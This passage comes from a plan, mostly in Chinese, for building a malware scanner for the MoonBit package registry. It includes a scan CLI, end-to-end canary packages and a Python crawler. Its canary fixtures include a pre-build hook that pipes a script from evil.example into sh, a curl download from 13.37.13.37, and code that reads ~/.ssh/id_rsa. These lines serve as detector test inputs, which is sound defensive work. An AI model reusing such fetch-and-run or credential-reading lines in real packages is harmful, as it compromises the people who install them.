  let kept = r.findings.filter(f => f.severity.rank() >= min_rank).collect()
  let risk = @score.risk_of(kept)
  { ..r, findings: kept, risk, verdict: @score.verdict_of(risk).to_string() }
}

///|
async fn main {
  let args = @env.args()
  match parse_args(args) {
    Help => println("usage: mooncake-audit scan <dir> [--json] [--hotlist f] [--min-severity sev]")
    Scan(..) as c => {
      let opts : @engine.ScanOptions = { hotlist: load_hotlist(c.hotlist) }
      let r = @engine.run_scan(c.dir, opts)
      let r = if c.module is not "" { { ..r, module: c.module } } else { r }
      let r = if c.version is not "" { { ..r, version: c.version } } else { r }
      let r = filter_min(r, c.min_sev)
      if c.json {
        println(r.to_json_string())
      } else {
        println(@report.human_summary(r))
      }
    }
  }
}
```

（`cmd/main/moon.pkg` 需导入 engine/report/matchers/async+fs+io/core/env/json 等；`filter` 返回迭代器用 `.collect()` 转 Array。`main` 包内 `parse_args`/`load_hotlist`/`filter_min` 为 pub 或包内可见，测试文件 `cli_test.mbt` 黑盒访问 `@main.parse_args` 需要 `pub`。）

- [ ] **Step 4: 手动验证 + 构建原生二进制**

```bash
mkdir -p /tmp/opencode/demo/src
printf 'name = "evil/asynx"\nversion = "0.1.0"\n' > /tmp/opencode/demo/moon.mod
printf 'let p = "/home/u/.ssh/id_rsa"\nlet c = @fs.read_file_to_string(p)\nprintln("http://13.37.13.37/c")\n' > /tmp/opencode/demo/src/a.mbt
printf 'moonbitlang/async\nmoonbitlang/core\n' > /tmp/opencode/demo/hot.txt
moon build --target native --release .
BIN=$(find _build/native/release -type f -name "*.exe" -o -type f -name "main" | head -1)
"$BIN" scan /tmp/opencode/demo --hotlist /tmp/opencode/demo/hot.txt
"$BIN" scan /tmp/opencode/demo --hotlist /tmp/opencode/demo/hot.txt --json
```
Expected: human summary 显示 M01+S01+S02+S99 finding（risk 55），verdict Malicious；JSON 为合法单行 JSON

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: scan CLI with json/hotlist/min-severity and exit codes"
```

---

### Task 12: canaries 端到端样例

**Files:**
- Create: `canaries/README.md`
- Create: `canaries/typo_malicious/moon.mod`, `canaries/typo_malicious/src/steal.mbt`
- Create: `canaries/prebuild_dropper/moon.mod`, `canaries/prebuild_dropper/moon.pkg.json`
- Create: `canaries/obfuscated_exfil/moon.mod`, `canaries/obfuscated_exfil/src/payload.mbt`
- Create: `canaries/benign_http/moon.mod`, `canaries/benign_http/src/client.mbt`, `canaries/benign_http/README.md`
- Test: `cmd/main/e2e_test.mbt`

**Interfaces:**
- Consumes: `@engine.run_scan`
- Produces: 4 个固定样例目录；e2e 测试断言 verdict。

**risk 推演（必须与评分模型一致）**：
- `typo_malicious`（`eviluser/asynx`）：M01(10)+S01(10)+S02(10)+S99(25)=55 → Malicious
- `prebuild_dropper`：S06(25)+S03(25)=50 → Malicious
- `obfuscated_exfil`：S04 High(10)+S04 Medium(5)=15 → Suspicious
- `benign_http`：0 → Clean

- [ ] **Step 1: 创建样例**

`canaries/typo_malicious/moon.mod`:
```
name = "eviluser/asynx"
version = "0.1.0"
description = "Async utilities"
```

`canaries/typo_malicious/src/steal.mbt`:
```moonbit
///|
fn exfiltrate() -> Unit raise {
  let creds = @fs.read_file_to_string("/home/user/.ssh/id_rsa")
  let _ = creds
  println("http://13.37.13.37/collect")
}
```

`canaries/prebuild_dropper/moon.mod`:
```
name = "eviluser/build-helper"
version = "0.1.0"
```

`canaries/prebuild_dropper/moon.pkg.json`:
```json
{
  "pre-build": [
    { "input": "x.txt", "output": "x.mbt", "command": "curl http://evil.example/d.sh | sh" }
  ]
}
```

`canaries/prebuild_dropper/src/drop.mbt`:
```moonbit
///|
fn setup() -> Unit raise {
  @shell.Cmd("curl", ["http://13.37.13.37/drop.sh"]) |> ignore
}
```

`canaries/obfuscated_exfil/moon.mod`:
```
name = "eviluser/obfz"
version = "0.1.0"
```

`canaries/obfuscated_exfil/src/payload.mbt`:
```moonbit
///|
let payload : String =
  "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgYmxvYiBmb3IgdGVzdGluZyBwdXJwb3NlcyBvbmx5IG5vdCByZWFs"

///|
fn decode_and_run() -> String {
  payload.from_base64()
}
```

（base64 字面量须 >80 字符（上面 96）；`from_base64` 触发 S04 Medium。实现时校验 `longest_run` 实际值，不足则加长。）

`canaries/benign_http/moon.mod`:
```
name = "goodorg/http-client-demo"
version = "0.1.0"
repository = "https://github.com/goodorg/http-client-demo"
```

`canaries/benign_http/src/client.mbt`:
```moonbit
///|
fn fetch() -> Unit {
  println("GET https://api.example.com/v1/items")
}
```

`canaries/benign_http/README.md`: 300+ 字符说明文本。

- [ ] **Step 2: 写 e2e 测试** `cmd/main/e2e_test.mbt`

```moonbit
///|
let canary = (name : String) => "../canaries/" + name

///|
async test "canary typo_malicious is malicious" {
  let r = @engine.run_scan(canary("typo_malicious"), { hotlist: ["moonbitlang/async"] })
  inspect(r.risk >= 50, content="true")
  inspect(r.verdict, content="Malicious")
}

///|
async test "canary prebuild_dropper is malicious" {
  let r = @engine.run_scan(canary("prebuild_dropper"), { hotlist: [] })
  inspect(r.verdict, content="Malicious")
}

///|
async test "canary obfuscated_exfil is at least suspicious" {
  let r = @engine.run_scan(canary("obfuscated_exfil"), { hotlist: [] })
  inspect(r.risk >= 15, content="true")
}

///|
async test "canary benign_http is clean" {
  let r = @engine.run_scan(canary("benign_http"), { hotlist: ["moonbitlang/async"] })
  inspect(r.verdict, content="Clean")
  inspect(r.risk, content="0")
}
```

（相对路径 `../canaries` 基于 moon test 的工作目录 = 模块根，需确认实际 cwd：若为包目录则路径不同，执行时用 `moon test -v` 调试定位，必要时改用绝对路径拼接 `@env.current_dir()`。）

- [ ] **Step 3: 运行确认失败→修正→通过**

Run: `moon test cmd/main 2>&1 | tail -5`
Expected: PASS

- [ ] **Step 4: 对官方模块零误报验证**

```bash
moon fetch moonbitlang/quickcheck@0.14.0
BIN=$(find _build/native/release -type f \( -name "*.exe" -o -name "main" \) | head -1)
"$BIN" scan .repos/moonbitlang/quickcheck/0.14.0
```
Expected: verdict Clean 或仅 Low 级 finding（如有误报，调规则阈值后补回归测试）

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "test: canary packages e2e (typo/prebuild/obfuscated/benign)"
```

---

### Task 13: Python — registry 客户端与安全下载

**Files:**
- Create: `crawl/__init__.py`（空）
- Create: `crawl/registry.py`
- Create: `crawl/download.py`
- Test: `crawl/test_registry.py`, `crawl/test_download.py`

**Interfaces:**
- Produces:
  - `registry.fetch_module_index() -> list[dict]`（GET /api/v0/modules）
  - `registry.download_url(name : str, version : str) -> str`（`https://download.mooncakes.io/user/{name}/{version}.zip`，name 含 author/）
  - `registry.fetch_bytes(url, rate_limit=0.5) -> bytes`（UA `mooncake-audit/0.1`）
  - `registry.build_hotlist(path : str, top_n=100) -> list[str]`（从 statistics zip 或 index 排序取前 N，写文件每行一个 name）
  - `download.safe_extract(data : bytes, dest : str, max_bytes=50_000_000, max_files=5_000)`（zip-slip：拒绝绝对路径/`..`/盘符；超限抛 `ValueError`）

- [ ] **Step 1: 写失败测试**

`crawl/test_download.py`:
```python
import zipfile, io, pytest
from crawl.download import safe_extract

def make_zip(names):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n in names:
            z.writestr(n, "x")
    return buf.getvalue()

def test_extract_ok(tmp_path):
    safe_extract(make_zip(["a/moon.mod", "a/src/x.mbt"]), str(tmp_path))
    assert (tmp_path / "a" / "moon.mod").exists()

def test_zip_slip_rejected(tmp_path):
    with pytest.raises(ValueError):
        safe_extract(make_zip(["../evil.txt"]), str(tmp_path))

def test_abs_path_rejected(tmp_path):
    with pytest.raises(ValueError):
        safe_extract(make_zip(["/etc/passwd"]), str(tmp_path))

def test_too_many_files(tmp_path):
    with pytest.raises(ValueError):
        safe_extract(make_zip([f"f{i}.txt" for i in range(10)]), str(tmp_path), max_files=5)
```

`crawl/test_registry.py`:
```python
from crawl.registry import download_url, build_hotlist

def test_download_url():
    assert download_url("daqing/moonkafka", "0.2.1") == "https://download.mooncakes.io/user/daqing/moonkafka/0.2.1.zip"

def test_hotlist(tmp_path):
    p = tmp_path / "hot.txt"
    mods = [{"name": "a/b", "version": "1.0"}, {"name": "c/d", "version": "2.0"}]
    hot = build_hotlist(str(p), modules=mods, top_n=1)
    assert hot == ["a/b"]
    assert p.read_text().strip() == "a/b"
```

- [ ] **Step 2: 运行确认失败**

Run: `python3 -m pytest crawl/test_download.py crawl/test_registry.py -v`
Expected: FAIL（ModuleNotFoundError）

- [ ] **Step 3: 实现**

`crawl/registry.py`:
```python
import io, time, urllib.request, zipfile

BASE = "https://mooncakes.io"
DL = "https://download.mooncakes.io"
UA = {"User-Agent": "mooncake-audit/0.1 (supply-chain research)"}
_last_get = 0.0


def fetch_bytes(url: str, rate_limit: float = 0.5) -> bytes:
    global _last_get
    wait = rate_limit - (time.monotonic() - _last_get)
    if wait > 0:
        time.sleep(wait)
    _last_get = time.monotonic()
    req = urllib.request.Request(url, headers=UA)
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.read()


def fetch_module_index() -> list[dict]:
    import json
    return json.loads(fetch_bytes(f"{BASE}/api/v0/modules").decode())


def download_url(name: str, version: str) -> str:
    return f"{DL}/user/{name}/{version}.zip"


def build_hotlist(path: str, modules: list[dict] | None = None, top_n: int = 100) -> list[str]:
    mods = modules if modules is not None else fetch_module_index()
    # 有下载统计时按下载量排序，否则按索引顺序
    names = [m["name"] for m in mods[:top_n]]
    with open(path, "w") as f:
        f.write("\n".join(names))
    return names


def parse_statistics_csv(data: bytes) -> list[tuple[str, int]]:
    z = zipfile.ZipFile(io.BytesIO(data))
    rows = []
    for line in z.read(z.namelist()[0]).decode().splitlines()[1:]:
        parts = line.split(",")
        if len(parts) >= 2:
            try:
                rows.append((parts[0], int(parts[1])))
            except ValueError:
                pass
    return rows
```

`crawl/download.py`:
```python
import io, os, posixpath, zipfile


def _safe_name(name: str) -> bool:
    if name.startswith("/") or (len(name) > 1 and name[1] == ":"):
        return False
    norm = posixpath.normpath(name)
    return not norm.startswith("..") and not norm.startswith("/")


def safe_extract(data: bytes, dest: str, max_bytes: int = 50_000_000, max_files: int = 5_000) -> None:
    if len(data) > max_bytes:
        raise ValueError(f"archive too large: {len(data)}")
    z = zipfile.ZipFile(io.BytesIO(data))
    infos = z.infolist()
    if len(infos) > max_files:
        raise ValueError(f"too many entries: {len(infos)}")
    if sum(i.file_size for i in infos) > max_bytes:
        raise ValueError("uncompressed size exceeds cap")
    os.makedirs(dest, exist_ok=True)
    for info in infos:
        if not _safe_name(info.filename):
            raise ValueError(f"unsafe path in archive: {info.filename}")
        target = os.path.join(dest, info.filename)
        if info.filename.endswith("/"):
            os.makedirs(target, exist_ok=True)
            continue
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with z.open(info) as src, open(target, "wb") as out:
            out.write(src.read())
```

- [ ] **Step 4: 运行测试通过**

Run: `python3 -m pytest crawl/ -v`
Expected: 全部 PASS

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: python registry client and zip-slip-safe extractor"
```

---

### Task 14: Python — runner / state / 爬取 CLI / 汇总报告

**Files:**
- Create: `crawl/state.py`, `crawl/runner.py`, `crawl/crawl.py`, `crawl/report.py`
- Test: `crawl/test_state.py`, `crawl/test_runner.py`

**Interfaces:**
- Produces:
  - `state.CrawlState.load(path) -> CrawlState`；`.done(name) -> bool`；`.mark(name, status : str)`；`.save()`（原子写：tmp + rename）
  - `runner.scan_package(engine_bin : str, pkg_dir : str, hotlist : str | None, timeout=60) -> dict`（subprocess 调 `scan --json`，解析 stdout 中最后一行 JSON；超时/无 JSON → `{"error": "..."}"`）
  - `crawl.crawl.main()`：`python3 -m crawl.crawl --engine BIN --modules all|sample:N|file:F --state state/crawl_state.json --workers 4 --rate 0.5 --hotlist state/hotlist.txt`（v1 只扫每模块最新版本）
  - `report.write_summary(results_path, out_path)`：Markdown 汇总（Malicious/Suspicious 分组表）

- [ ] **Step 1: 写失败测试**

`crawl/test_state.py`:
```python
from crawl.state import CrawlState

def test_state_roundtrip(tmp_path):
    p = tmp_path / "s.json"
    s = CrawlState.load(str(p))
    s.mark("a/b", "ok")
    s.save()
    s2 = CrawlState.load(str(p))
    assert s2.done("a/b")
    assert not s2.done("c/d")

def test_state_failures(tmp_path):
    p = tmp_path / "s.json"
    s = CrawlState.load(str(p))
    s.mark("x/y", "fail:timeout")
    s.save()
    s2 = CrawlState.load(str(p))
    assert s2.failures() == ["x/y"]
```

`crawl/test_runner.py`:
```python
import json, stat, textwrap
from crawl.runner import scan_package

def _write_engine(tmp_path, body):
    p = tmp_path / "fake_engine.sh"
    p.write_text(textwrap.dedent(body))
    p.chmod(p.stat().st_mode | stat.S_IEXEC)
    return str(p)

def test_scan_package_parses_json(tmp_path):
    engine = _write_engine(tmp_path, "#!/bin/sh\necho '{\"module\":\"a/b\",\"risk\":30,\"verdict\":\"Suspicious\",\"findings\":[],\"errors\":[]}'\n")
    r = scan_package(engine, "/tmp/fakepkg", None)
    assert r["verdict"] == "Suspicious"

def test_scan_package_timeout(tmp_path):
    engine = _write_engine(tmp_path, "#!/bin/sh\nsleep 10\n")
    r = scan_package(engine, "/tmp/fakepkg", None, timeout=1)
    assert "error" in r
```

- [ ] **Step 2: 运行确认失败**

Run: `python3 -m pytest crawl/test_state.py crawl/test_runner.py -v`
Expected: FAIL

- [ ] **Step 3: 实现**

`crawl/state.py`:
```python
import json, os, tempfile


class CrawlState:
    def __init__(self, path: str, data: dict | None = None):
        self.path = path
        self.data = data or {"done": {}, "failed": {}}

    @classmethod
    def load(cls, path: str) -> "CrawlState":
        if os.path.exists(path):
            with open(path) as f:
                return cls(path, json.load(f))
        return cls(path)

    def done(self, name: str) -> bool:
        return name in self.data["done"]

    def mark(self, name: str, status: str) -> None:
        if status == "ok":
            self.data["done"][name] = True
        else:
            self.data["failed"][name] = status

    def failures(self) -> list[str]:
        return sorted(self.data["failed"])

    def save(self) -> None:
        os.makedirs(os.path.dirname(self.path) or ".", exist_ok=True)
        fd, tmp = tempfile.mkstemp(dir=os.path.dirname(self.path) or ".")
        with os.fdopen(fd, "w") as f:
            json.dump(self.data, f, indent=1)
        os.replace(tmp, self.path)
```

`crawl/runner.py`:
```python
import json, subprocess


def scan_package(engine_bin: str, pkg_dir: str, hotlist: str | None, timeout: int = 60) -> dict:
    cmd = [engine_bin, "scan", pkg_dir, "--json"]
    if hotlist:
        cmd += ["--hotlist", hotlist]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return {"module": pkg_dir, "error": "timeout"}
    for line in reversed(p.stdout.strip().splitlines()):
        line = line.strip()
        if line.startswith("{"):
            return json.loads(line)
    return {"module": pkg_dir, "error": f"exit {p.returncode}: {p.stderr[-200:]}"}
```

`crawl/crawl.py`:
```python
import argparse, concurrent.futures, os, shutil, sys, time
from . import registry, download, runner
from .state import CrawlState


def select_modules(index: list[dict], spec: str) -> list[dict]:
    if spec == "all":
        return index
    if spec.startswith("sample:"):
        n = int(spec.split(":")[1])
        return index[:n]
    if spec.startswith("file:"):
        with open(spec[5:]) as f:
            want = {l.strip() for l in f if l.strip()}
        return [m for m in index if m["name"] in want]
    raise SystemExit(f"bad --modules spec: {spec}")


def main() -> None:
    ap = argparse.ArgumentParser(prog="crawl")
    ap.add_argument("--engine", required=True, help="path to mooncake-audit native binary")
    ap.add_argument("--modules", default="sample:50")
    ap.add_argument("--state", default="state/crawl_state.json")
    ap.add_argument("--corpus", default="corpus")
    ap.add_argument("--results", default="results/results.jsonl")
    ap.add_argument("--hotlist", default="state/hotlist.txt")
    ap.add_argument("--workers", type=int, default=4)
    ap.add_argument("--rate", type=float, default=0.5)
    args = ap.parse_args()

    index = registry.fetch_module_index()
    mods = select_modules(index, args.modules)
    state = CrawlState.load(args.state)
    os.makedirs(os.path.dirname(args.results) or ".", exist_ok=True)
    todo = [m for m in mods if not state.done(m["name"])]
    print(f"modules={len(mods)} todo={len(todo)}")

    sem_rate = args.rate

    def job(m: dict) -> None:
        name, version = m["name"], m["version"]
        pkg_dir = os.path.join(args.corpus, name)
        try:
            if not os.path.exists(os.path.join(pkg_dir, "moon.mod")):
                data = registry.fetch_bytes(registry.download_url(name, version), sem_rate)
                download.safe_extract(data, pkg_dir)
            report = runner.scan_package(args.engine, pkg_dir, args.hotlist)
            report.setdefault("module", name)
            report["version"] = version
            status = "ok"
        except Exception as e:  # noqa: BLE001
            report = {"module": name, "error": str(e)[:200]}
            status = f"fail:{type(e).__name__}"
        with open(args.results, "a") as f:
            f.write(json.dumps(report, ensure_ascii=False) + "\n")
        state.mark(name, status)
        state.save()

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        for i, m in enumerate(todo):
            ex.submit(job, m)
            if (i + 1) % 50 == 0:
                print(f"queued {i + 1}/{len(todo)}")
    print("crawl complete")


if __name__ == "__main__":
    main()
```

`crawl/report.py`:
```python
import json
from collections import defaultdict


def write_summary(results_path: str, out_path: str) -> None:
    groups = defaultdict(list)
    n = 0
    with open(results_path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            r = json.loads(line)
            n += 1
            groups[r.get("verdict", "Error")].append(r)
    with open(out_path, "w") as out:
        out.write(f"# mooncakes.io audit summary\n\nscanned: {n}\n\n")
        for verdict in ("Malicious", "Suspicious", "Error", "Clean"):
            rows = groups.get(verdict, [])
            out.write(f"## {verdict} ({len(rows)})\n\n")
            if verdict == "Clean":
                continue
            out.write("| module | risk | findings |\n|---|---|---|\n")
            for r in sorted(rows, key=lambda r: -r.get("risk", 0)):
                rules = ",".join(sorted({f["rule"] for f in r.get("findings", [])}))
                out.write(f"| {r.get('module')} | {r.get('risk')} | {rules} |\n")
            out.write("\n")
```

（`fetch_module_index` 增加 rate 参数或在 crawl.py 中简化——执行时以实际签名为准对齐。）

- [ ] **Step 4: 运行测试通过 + 真实冒烟**

```bash
python3 -m pytest crawl/ -v
python3 -c "
from crawl import registry
idx = registry.fetch_module_index()
print(len(idx), idx[0]['name'])
"
python3 -m crawl.crawl --engine "$(find _build/native/release -type f -executable | head -1)" --modules sample:5
cat results/results.jsonl
```
Expected: 单元测试全 PASS；真实拉取 5 个模块并产出 5 行 JSONL；人工检查 verdict 合理

（注：crawl.crawl 中 `fetch_module_index` 未做限流——索引为单请求，无需限流；限流作用于逐包下载 `fetch_bytes`。）

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: crawl orchestrator (state/runner/cli/summary) with real-registry smoke"
```

---

### Task 15: hotlist 构建 + 采样试运行 + 全量爬取入口

**Files:**
- Create: `crawl/hotlist.py`
- Test: `crawl/test_hotlist.py`
- Modify: `README.mbt.md`（根，使用说明）

**Interfaces:**
- Produces: `python3 -m crawl.hotlist --out state/hotlist.txt [--top 100]`——从 statistics CSV（有下载量）优先，缺省用索引前 N；README 记录全量爬取命令。

- [ ] **Step 1: 写失败测试** `crawl/test_hotlist.py`

```python
from crawl.hotlist import pick_hot

def test_pick_hot_prefers_downloads():
    stats = [("pop/x", 999), ("tiny/y", 1)]
    index = [{"name": "tiny/y"}, {"name": "pop/x"}, {"name": "mid/z"}]
    assert pick_hot(stats, index, top_n=2) == ["pop/x", "mid/z"]

def test_pick_hot_no_stats():
    index = [{"name": "a/b"}, {"name": "c/d"}]
    assert pick_hot([], index, top_n=1) == ["a/b"]
```

- [ ] **Step 2: 运行确认失败**

Run: `python3 -m pytest crawl/test_hotlist.py -v`
Expected: FAIL

- [ ] **Step 3: 实现** `crawl/hotlist.py`

```python
import argparse, os
from . import registry


def pick_hot(stats: list[tuple[str, int]], index: list[dict], top_n: int = 100) -> list[str]:
    known = {m["name"] for m in index}
    ranked = [name for name, _ in sorted(stats, key=lambda kv: -kv[1]) if name in known]
    rest = [m["name"] for m in index if m["name"] not in set(ranked)]
    return (ranked + rest)[:top_n]


def main() -> None:
    ap = argparse.ArgumentParser(prog="hotlist")
    ap.add_argument("--out", default="state/hotlist.txt")
    ap.add_argument("--top", type=int, default=100)
    args = ap.parse_args()
    index = registry.fetch_module_index()
    try:
        data = registry.fetch_bytes("https://mooncakes.io/api-new/v0/modules/statistics?raw=true")
        stats = registry.parse_statistics_csv(data)
    except Exception:  # noqa: BLE001
        stats = []
    hot = pick_hot(stats, index, args.top)
    os.makedirs(os.path.dirname(args.out) or ".", exist_ok=True)
    with open(args.out, "w") as f:
        f.write("\n".join(hot))
    print(f"hotlist: {len(hot)} -> {args.out}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: 运行测试 + 采样 50 试运行**

```bash
python3 -m pytest crawl/ -v
python3 -m crawl.hotlist --out state/hotlist.txt --top 100
python3 -m crawl.crawl --engine "$(find _build/native/release -type f -executable | head -1)" --modules sample:50
python3 -c "from crawl.report import write_summary; write_summary('results/results.jsonl','results/summary.md')"
cat results/summary.md
```
Expected: 50 包全部产出报告；summary.md 有 Malicious/Suspicious/Clean 分组；对命中项人工抽查源码确认误报率可接受

- [ ] **Step 5: 根 README + 全量入口文档**

`README.mbt.md` 记录：构建（`moon build --target native --release .`）、单包扫描、`--modules all` 全量爬取命令（含 `--all-versions` 可选）、断点续跑说明（重跑同一命令自动跳过 done）、产物说明（results.jsonl/summary.md）。

- [ ] **Step 6: Commit**

```bash
git add -A && git commit -m "feat: hotlist builder, sampled pilot run, full-crawl docs"
```

---

## 全量爬取（计划外操作步骤，Task 15 完成后与用户确认执行）

```bash
python3 -m crawl.crawl --engine "$(find _build/native/release -type f -executable | head -1)" --modules all
python3 -c "from crawl.report import write_summary; write_summary('results/results.jsonl','results/summary.md')"
```

对 Malicious/Suspicious 命中逐条人工复核（读 corpus 下源码），产出真实投毒包发现结论。

## Self-Review 记录

- **Spec coverage**：spec §2–§9 每项均有对应任务（安全边界→Task 10/13；M/S 规则→Task 6/7/8；评分→Task 9；Python 编排→Task 13/14/15；canaries 与官方包零误报→Task 12；采样试运行→Task 15；全量爬取→计划外操作节）。`--all-versions` 为 spec 中"可选"项，v1 明确不做（只扫最新版本），已在 Task 14 标注。
- **Placeholder scan**：已清理 S01 占位草稿（改为完整实现）、`hasattr` 残行、未定义的 `basename`/`load_hotlist`/`filter_min`（均已给出实现）。
- **Type consistency**：`findings_for` 签名统一为 5 参；`Severity::label()` 供插值（不 derive Show）；canary 风险推演与 50/15 阈值一致；AC 测试期望值修正（排序后 [0,1,3]）。
